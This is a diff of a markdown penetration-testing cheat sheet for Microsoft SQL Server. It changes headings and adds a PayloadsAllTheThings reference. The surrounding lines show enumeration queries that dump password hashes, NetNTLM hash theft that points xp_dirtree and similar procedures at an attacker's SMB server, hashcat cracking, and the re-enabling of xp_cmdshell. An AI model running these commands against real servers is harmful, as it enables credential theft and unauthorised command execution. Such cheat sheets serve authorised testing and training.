@@ -1,6 +1,6 @@
 # MSSQL
 
-## Connection
+# Connection
 ```sh
 # mssqlclient
 impacket-mssqlclient <domain>/<username>:<password>@<ip>
@@ -9,7 +9,7 @@ impacket-mssqlclient <domain>/<username>:<password>@<ip>
 sqlcmd -S <IP> -U <username> -P <password> -d <database_name> -Q <query>
 ```
 
-## Enumeration
+# Enumeration
 ```sql
 -- Get version
 SELECT @@version;
@@ -34,7 +34,7 @@ SELECT sp.name AS LOGIN, sp.type_desc AS LOGIN_TYPE, sl.password_hash, sp.create
 SELECT * FROM sys.database_principals;
 ```
 
-## Steal NetNTLM hash
+# Steal NetNTLM Hash
 When executing a command on the SQL server which requests resources from the attacker's SMB server, the hash will be captured on that server.
 1. Start an **SMB server** to capture hash upon request *(local)*.
     ```sh
@@ -51,12 +51,12 @@ When executing a command on the SQL server which requests resources from the att
     EXEC master..xp_subdirs "\\<IP>\anything\"
     EXEC master..xp_fileexist "\\<IP>\anything\"
     ```
-### Cracking the hash
+## Cracking the hash
 ```sh
 hashcat -m 5600 <hash_file> <wordlist>
 ```
 
-## Command Execution
+# Command Execution
 1. If needed reactivate `xp_cmdshell`
     ```sql
     EXEC sp_configure 'show advanced options',1;
@@ -68,3 +68,6 @@ hashcat -m 5600 <hash_file> <wordlist>
     ```sql
     EXEC xp_cmdshell 'ping 127.0.0.1';
     ```
+
+# References
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
